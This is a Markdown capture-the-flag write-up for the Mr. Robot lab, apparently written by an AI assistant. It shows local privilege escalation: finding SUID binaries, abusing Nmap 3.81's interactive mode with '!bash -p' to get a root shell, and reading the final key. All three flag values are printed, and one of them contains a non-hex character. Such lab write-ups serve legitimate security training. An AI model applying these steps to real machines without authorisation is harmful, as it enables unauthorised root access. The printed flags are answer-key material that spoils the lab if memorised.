
```markdown
# Mr. Robot CTF Write-Up: Key 3 – Privilege Escalation via Vulnerable Nmap

After exploring Robot's directory and not finding any clues for the third key, I moved on to privilege escalation in order to get root access.

Following a well-known Linux privilege escalation checklist ([g0tmi1k's guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)), I decided to check for SUID binaries—files that run with the permissions of their owner (often root) rather than the user executing them.

## 1. Finding SUID Binaries

```bash
find / -user root -perm -4000 2>/dev/null
```

### Explanation:
- `find /`: Searches from the root directory.
- `-user root`: Limits results to files owned by the root user.
- `-perm -4000`: Looks for files with the SUID bit set.
- `2>/dev/null`: Hides permission-denied errors.

### Output (relevant section):
```
/usr/local/bin/nmap
```

Among the standard SUID binaries, `/usr/local/bin/nmap` stood out — an older version of Nmap (3.81) known to be vulnerable when set with the SUID bit.

---

## 2. Investigating the Nmap Binary

```bash
/usr/local/bin/nmap --version
```

### Output:
```
nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

This confirmed that the system was running an old version of Nmap, which allows privilege escalation via its interactive mode.

---

## 3. Exploiting Nmap for Root Access

```bash
nmap --interactive
```

### Output:
```
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

While in interactive mode, I used the `!` operator to execute shell commands:

```bash
nmap> !whoami
```

### Output:
```
root
waiting to reap child : No child processes
```

Boom! The command runs as root.

---

## 4. Spawning a Root Shell

To get a full root shell:

```bash
nmap> !bash -p
```

### Output:
```
bash-4.3#
```

`-p` ensures the shell retains root privileges and avoids resetting certain environment variables.

---

## 5. Retrieving the Final Key

Navigated to the root home directory and listed the files:

```bash
cd /root
ls -al
```

### Output:
```
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
```

Read the contents of the final key file:

```bash
cat key-3-of-3.txt
```

### Output:
```
04787ddef27c3dee1ee161b21670b4e4
```

---

## ✅ CTF Complete – All Keys Found!

```
1. 073403c8a58alf80d943455fb30724b9  
2. 822c73956184f694993bede3eb39f959  
3. 04787ddef27c3dee1ee161b21670b4e4
```

---

## Notes

- This privilege escalation only worked because `nmap` was an outdated and misconfigured SUID binary.
- Always check for known vulnerable binaries when doing post-exploitation privilege escalation.
```

---

Let me know if you'd like a front matter block for Jekyll or a table of contents added too!
